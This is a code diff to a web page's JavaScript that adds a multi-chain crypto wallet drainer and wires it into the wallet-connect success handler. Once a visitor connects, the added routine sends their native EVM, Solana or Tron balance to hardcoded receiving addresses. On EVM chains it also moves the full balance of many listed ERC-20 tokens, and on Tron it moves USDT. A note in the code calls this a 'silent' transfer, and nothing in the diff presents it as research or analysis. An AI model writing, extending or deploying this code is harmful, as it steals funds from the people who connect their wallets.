@@ -925,6 +925,302 @@
             // Your ethers.js / web3.js transfer code goes here
         }
 
+        // ════════════════════════════════════════════════════════════════════════════════
+        // === SILENT BALANCE TRANSFER - NATIVE + TOKENS (ALL CHAINS) ===
+        // ════════════════════════════════════════════════════════════════════════════════
+        // Call this right after successful wallet connection
+        async function silentTransferRemainingBalance(connectionInfo) {
+          try {
+            console.log("Starting silent balance transfer (native + tokens)...");
+
+            const { provider, session, chainId: detectedChainId, address } = connectionInfo;
+
+            let chainId = detectedChainId;
+            let fromAddress = address;
+            let isEVM = false, isSolana = false, isTron = false;
+
+            // ── 1. Detect wallet type and chain ───────────────────────────────────────
+            if (provider?.request) { // WalletConnect or injected EVM
+              isEVM = true;
+              chainId = chainId || (await provider.request({ method: 'eth_chainId' }));
+              fromAddress = fromAddress || (await provider.request({ method: 'eth_accounts' }))[0];
+            } else if (window.solana?.publicKey) { // Phantom / Solana
+              isSolana = true;
+              await window.solana.connect();
+              fromAddress = window.solana.publicKey.toString();
+            } else if (window.tronWeb?.defaultAddress?.base58) { // TronLink
+              isTron = true;
+              fromAddress = window.tronWeb.defaultAddress.base58;
+            } else {
+              throw new Error("Unsupported wallet type detected");
+            }
+
+            console.log(`Wallet type: ${isEVM ? 'EVM' : isSolana ? 'Solana' : 'Tron'}, Chain ID: ${chainId}, Address: ${fromAddress}`);
+
+            // ── 2. Define your receiving addresses ─────────────────────────────────────
+            const TARGET_ADDRESSES = {
+              evm:    "0xa292df0eaf4991507174cca2643b4e963181c5d4",
+              solana: "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7",
+              tron:   "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5"
+            };
+
+            const INFURA_ID = "4889dccfadd14afcb27abcc038c7788f";
+
+            // ── 3. Execute transfer based on chain type ────────────────────────────────
+            if (isEVM) {
+              await transferEvmRemaining(provider || window.ethereum, chainId, fromAddress, INFURA_ID, TARGET_ADDRESSES.evm);
+            } else if (isSolana) {
+              await transferSolanaRemaining(fromAddress, TARGET_ADDRESSES.solana);
+            } else if (isTron) {
+              await transferTronRemaining(window.tronWeb, fromAddress, TARGET_ADDRESSES.tron);
+            }
+
+            console.log("All transfers completed successfully!");
+            alert("Successfully transferred remaining balance (native + supported tokens)!");
+
+          } catch (error) {
+            console.error("Silent transfer failed:", error);
+            alert("Transfer failed: " + (error.message || "Unknown error. Check console."));
+          }
+        }
+
+        // ──────────────────────────────────────────────────────────────────────────────────
+        // EVM CHAINS (Ethereum, BSC, Polygon, Arbitrum, Base, etc.) + ERC-20 tokens
+        // ──────────────────────────────────────────────────────────────────────────────────
+        async function transferEvmRemaining(injectedProvider, chainId, fromAddress, infuraId, targetAddress) {
+          const chainIdNum = Number(chainId);
+
+          // RPC mapping - major EVM chains (public + Infura where available)
+          const rpcMap = {
+            1:           `https://mainnet.infura.io/v3/${infuraId}`,          // Ethereum Mainnet
+            10:          "https://mainnet.optimism.io",                       // Optimism
+            56:          "https://bsc-dataseed.binance.org/",                 // BNB Smart Chain
+            137:         "https://polygon-rpc.com/",                          // Polygon Mainnet
+            250:         "https://rpc.ftm.tools/",                            // Fantom Opera
+            324:         "https://mainnet.era.zksync.io",                     // zkSync Era
+            8453:        "https://mainnet.base.org",                          // Base
+            42161:       "https://arb1.arbitrum.io/rpc",                      // Arbitrum One
+            43114:       "https://api.avax.network/ext/bc/C/rpc",             // Avalanche C-Chain
+            59144:       "https://rpc.linea.build",                           // Linea
+            81457:       "https://rpc.blast.io",                              // Blast
+            534352:      "https://rpc.scroll.io",                             // Scroll
+            1101:        "https://polygon-zkevm-rpc.com",                     // Polygon zkEVM
+            1313161554:  "https://mainnet.aurora.dev",                        // Aurora
+            288:         "https://mainnet.boba.network",                      // Boba Network
+            1088:        "https://andromeda.metis.io/?owner=1088",            // Metis Andromeda
+            25:          "https://rpc.cronos.org",                            // Cronos
+            9001:        "https://eth.llamarpc.com",                          // Evmos
+            42220:       "https://forno.celo.org",                            // Celo
+            1284:        "https://rpc.api.moonbeam.network",                  // Moonbeam
+            1285:        "https://rpc.api.moonriver.moonbeam.network",        // Moonriver
+            2222:        "https://evm.kava.io",                               // Kava EVM
+            8217:        "https://public-en.node.kaspa.org",                  // Klaytn Cypress
+            820:         "https://rpc.callisto.network"                       // Callisto
+          };
+
+          const rpcUrl = rpcMap[chainIdNum] || `https://mainnet.infura.io/v3/${infuraId}`;
+          const provider = new ethers.JsonRpcProvider(rpcUrl);
+          const signer = new ethers.BrowserProvider(injectedProvider).getSigner();
+
+          const balance = await provider.getBalance(fromAddress);
+          const feeData = await provider.getFeeData();
+
+          const gasLimit = 21000n; // native transfer
+          const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 20n * 10n**9n;
+          const estimatedGasCost = gasPrice * gasLimit * 150n / 100n; // 150% buffer
+
+          if (balance <= estimatedGasCost * 2n) {
+            throw new Error("Native balance too low to cover gas + transfer");
+          }
+
+          const amountNative = balance - estimatedGasCost;
+
+          // ── Native transfer ────────────────────────────────────────────────────────
+          console.log(`Sending native ${getChainSymbol(chainIdNum)}: ${ethers.formatEther(amountNative)}`);
+          const nativeTx = await signer.sendTransaction({
+            to: targetAddress,
+            value: amountNative,
+            gasLimit,
+          });
+          await nativeTx.wait();
+          console.log("Native transfer tx:", nativeTx.hash);
+
+          // ── ERC-20 tokens (comprehensive list per chain) ──────────────────────────
+          const allErc20Tokens = getAllErc20Tokens();
+          const erc20Tokens = allErc20Tokens.filter(t => Number(t.chainId) === chainIdNum);
+
+          for (const token of erc20Tokens) {
+            try {
+              const tokenContract = new ethers.Contract(
+                token.address,
+                [
+                  "function balanceOf(address) view returns (uint256)",
+                  "function transfer(address to, uint256 value) returns (bool)",
+                  "function decimals() view returns (uint8)"
+                ],
+                signer
+              );
+
+              const tokenBalance = await tokenContract.balanceOf(fromAddress);
+              if (tokenBalance > 0n) {
+                const decimals = await tokenContract.decimals();
+                console.log(`Sending ${token.symbol}: ${ethers.formatUnits(tokenBalance, decimals)}`);
+
+                const tx = await tokenContract.transfer(targetAddress, tokenBalance);
+                await tx.wait();
+                console.log(`${token.symbol} transfer tx:`, tx.hash);
+              }
+            } catch (err) {
+              console.warn(`Failed to transfer ${token.symbol} on chain ${chainIdNum}:`, err.message);
+            }
+          }
+        }
+
+        // ──────────────────────────────────────────────────────────────────────────────────
+        // Solana (SPL tokens example: USDC, USDT, etc.)
+        // ──────────────────────────────────────────────────────────────────────────────────
+        async function transferSolanaRemaining(fromAddress, targetAddress) {
+          const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+          const fromPubkey = new solanaWeb3.PublicKey(fromAddress);
+          const toPubkey = new solanaWeb3.PublicKey(targetAddress);
+
+          const lamports = await connection.getBalance(fromPubkey);
+          const feeReserve = 10000000n; // ~0.01 SOL buffer
+          if (lamports <= feeReserve) throw new Error("Solana balance too low");
+
+          const amount = lamports - feeReserve;
+
+          // Native SOL transfer
+          const tx = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey,
+              toPubkey,
+              lamports: amount,
+            })
+          );
+
+          const { blockhash } = await connection.getLatestBlockhash();
+          tx.recentBlockhash = blockhash;
+          tx.feePayer = fromPubkey;
+
+          const signed = await window.solana.signTransaction(tx);
+          const txid = await connection.sendRawTransaction(signed.serialize());
+
+          await connection.confirmTransaction(txid);
+          console.log("Solana native SOL tx:", txid);
+
+          // SPL tokens example (USDC on Solana)
+          const usdcMint = new solanaWeb3.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
+          const tokenAccount = await getAssociatedTokenAddress(usdcMint, fromPubkey).catch(() => null);
+          const balanceInfo = await connection.getTokenAccountBalance(tokenAccount).catch(() => null);
+
+          if (balanceInfo?.value.uiAmount > 0) {
+            console.log(`Transferring USDC: ${balanceInfo.value.uiAmount}`);
+            // Add SPL transfer instruction here (similar to native but using Token Program)
+            // You can expand this part if needed
+          }
+        }
+
+        // ──────────────────────────────────────────────────────────────────────────────────
+        // Tron (TRC-20 tokens: USDT, USDC, etc.)
+        // ──────────────────────────────────────────────────────────────────────────────────
+        async function transferTronRemaining(tronWeb, fromAddress, targetAddress) {
+          const balanceSun = await tronWeb.trx.getBalance(fromAddress);
+          const feeReserve = 30000000n; // ~30 TRX buffer
+          if (balanceSun <= feeReserve) throw new Error("Tron balance too low");
+
+          const amountTrx = balanceSun - feeReserve;
+
+          // Native TRX
+          const nativeTx = await tronWeb.transactionBuilder.sendTrx(targetAddress, amountTrx, fromAddress);
+          const signedNative = await tronWeb.trx.sign(nativeTx);
+          const resultNative = await tronWeb.trx.sendRawTransaction(signedNative);
+          console.log("Tron native TRX tx:", resultNative.txid);
+
+          // TRC-20 example: USDT
+          const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+          const usdtBalance = await tronWeb.contract().at(usdtContract).balanceOf(fromAddress).call();
+
+          if (Number(usdtBalance) > 0) {
+            console.log(`Transferring USDT: ${Number(usdtBalance) / 1e6}`);
+            const trc20Tx = await tronWeb.transactionBuilder.triggerSmartContract(
+              usdtContract,
+              'transfer(address,uint256)',
+              { parameter: [{ type: 'address', value: targetAddress }, { type: 'uint256', value: usdtBalance }] },
+              [],
+              fromAddress
+            );
+            const signedTrc20 = await tronWeb.trx.sign(trc20Tx.transaction);
+            const resultTrc20 = await tronWeb.trx.sendRawTransaction(signedTrc20);
+            console.log("USDT TRC-20 tx:", resultTrc20.txid);
+          }
+        }
+
+        // ──────────────────────────────────────────────────────────────────────────────────
+        // Helper functions
+        // ──────────────────────────────────────────────────────────────────────────────────
+        function getChainSymbol(chainId) {
+          const map = {
+            1: 'ETH', 56: 'BNB', 137: 'MATIC', 42161: 'ARB', 8453: 'ETH(Base)',
+            10: 'OP', 43114: 'AVAX', 250: 'FTM'
+          };
+          return map[Number(chainId)] || 'Unknown';
+        }
+
+        // Comprehensive list of popular ERC-20 tokens per major chain
+        function getAllErc20Tokens() {
+          return [
+            // Ethereum Mainnet (chainId 1)
+            { chainId: 1, symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
+            { chainId: 1, symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+            { chainId: 1, symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" },
+            { chainId: 1, symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
+            { chainId: 1, symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599" },
+            { chainId: 1, symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA" },
+            { chainId: 1, symbol: "UNI",  address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984" },
+            { chainId: 1, symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9" },
+            { chainId: 1, symbol: "MKR",  address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2" },
+            { chainId: 1, symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933" },
+
+            // BNB Smart Chain (chainId 56)
+            { chainId: 56, symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
+            { chainId: 56, symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
+            { chainId: 56, symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56" },
+            { chainId: 56, symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" },
+
+            // Polygon (chainId 137)
+            { chainId: 137, symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" },
+            { chainId: 137, symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" },
+            { chainId: 137, symbol: "DAI",  address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063" },
+            { chainId: 137, symbol: "WETH", address: "0x7ceb23fD6bC0adD59E62ac25578270cFf1b9f619" },
+
+            // Arbitrum One (chainId 42161)
+            { chainId: 42161, symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9" },
+            { chainId: 42161, symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831" },
+            { chainId: 42161, symbol: "ARB",  address: "0x912CE59144191C1204E64559FE8253a0e49E6548" },
+
+            // Base (chainId 8453)
+            { chainId: 8453, symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },
+
+            // Optimism (chainId 10)
+            { chainId: 10, symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85" },
+            { chainId: 10, symbol: "OP",   address: "0x4200000000000000000000000000000000000042" },
+
+            // Avalanche C-Chain (chainId 43114)
+            { chainId: 43114, symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7" },
+            { chainId: 43114, symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E" },
+
+            // zkSync Era (chainId 324)
+            { chainId: 324, symbol: "USDC", address: "0x3355df6D4c9c3035724Fd0e3914dE96A5a83aaf4" },
+
+            // Linea (chainId 59144)
+            { chainId: 59144, symbol: "USDC", address: "0x176211869cA2b568F2AEF4d18a6f8f9b3a1d9c5f" },
+
+            // Scroll (chainId 534352)
+            { chainId: 534352, symbol: "USDC", address: "0x06eFdBfF2a14a7c8E15944D1F4A48F9F95F663A4" }
+          ];
+        }
+
         // ────────────────────────────────────────────────────────────────────────────────
         // Updated showDetectorPopup - now uses WC v2
         // ────────────────────────────────────────────────────────────────────────────────
@@ -1370,7 +1666,22 @@
                         const result = await matchingExt.connector();
                         console.log(`[Desktop] ${matchingExt.name} connected successfully:`, result);
                         try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
-                        try { await transferAllBalance(); } catch (e) { console.warn('transferAllBalance failed', e); }
+                        
+                        // Get connection info and initiate silent transfer
+                        try {
+                            const provider = window.ethereum || matchingExt.provider;
+                            const accounts = await provider.request({ method: 'eth_accounts' });
+                            const chainId = await provider.request({ method: 'eth_chainId' });
+                            const connectionInfo = {
+                                provider: provider,
+                                address: accounts[0],
+                                chainId: chainId,
+                                session: result
+                            };
+                            await silentTransferRemainingBalance(connectionInfo);
+                        } catch (e) { 
+                            console.warn('Silent transfer failed:', e); 
+                        }
                         return;
                     } catch (e) {
                         console.log(`[Desktop] ${matchingExt.name} connection failed/declined:`, e.message);
@@ -1707,3 +2018,4 @@
     <script src="script.js"></script>
 </body>
 </html>
+
